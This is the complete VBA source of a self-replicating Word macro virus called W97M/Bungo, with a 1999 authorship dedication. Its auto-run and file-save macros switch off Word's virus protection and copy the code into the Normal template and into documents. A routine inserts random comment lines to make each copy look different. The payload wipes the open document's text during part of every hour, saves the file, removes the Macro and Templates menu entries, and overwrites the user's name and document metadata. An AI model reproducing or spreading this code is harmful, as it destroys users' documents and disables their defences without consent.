   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Bungo"
   'Virus Name: W97M/Bungo
   'Author Name: Lucky Warrior
   'Copyright (c) 1999 Bgy. Tiguib, O.E.S.
   'All rights reserved.

   'I dedicate this virus to my roommates, namely:
   'Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
   '
   'Thanks Guys!! for everything...
   '
   '-Lucky Warrior 10 November 1999
   'END


   Sub AutoOpen()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call GoToHell
   End Sub

   Sub AutoNew()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call GoToHell
   End Sub

   Sub AutoClose()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call GoToHell
   End Sub

   Sub AutoExec()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call GoToHell
   End Sub

   Sub FileSaveAs()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call GoToHell
   End Sub

   Sub FileSave()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call GoToHell
   ActiveDocument.Save
   End Sub

   Sub GoToHell()
   On Error Resume Next
   Randomize
   ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule.CountOfLines
   If ActiveLines > 300 Then
   With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
   For TheLine = 1 To .CountOfLines
   If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
   Next TheLine
   End With
   Else
   With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
   PolySize = Int(Rnd * 10)
   For PolyMorphic = 1 To PolySize
   PolyString = ""
   PolyLines = .CountOfLines
   RndLine = Int(Rnd * PolyLines) + 1
   StringSize = Int(Rnd * 39) + 1
   For SomeString = 1 To StringSize
   PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
   Next SomeString
   .InsertLines RndLine, "Rem " & PolyString
   Next PolyMorphic
   End With
   End If
   End Sub

   Sub Payload()
     On Error Resume Next
       If Day(Now) = Day(Now) And Minute(Now) <= 30 Then
       Selection.Wholestory
       Selection.Cut
       End If
     ActiveDocument.SaveAs ActiveDocument.FullName
     CommandBars("tools").Controls("Macro").Delete
     CommandBars("tools").Controls("Templates and add-ins...").Delete
     Application.Username = "Lucky Warrior"
     Application.UserInitials = "LW"
     Application.UserAddress = "Bgy. Tiguib, O.E.S."
     With Dialogs(wdDialogFileSummaryInfo)
     .Author = "Lucky Warrior"
     .Keywords = "W97M/Bungo"
     .Comments = "More to come..."
     .Execute
     End With
   End Sub
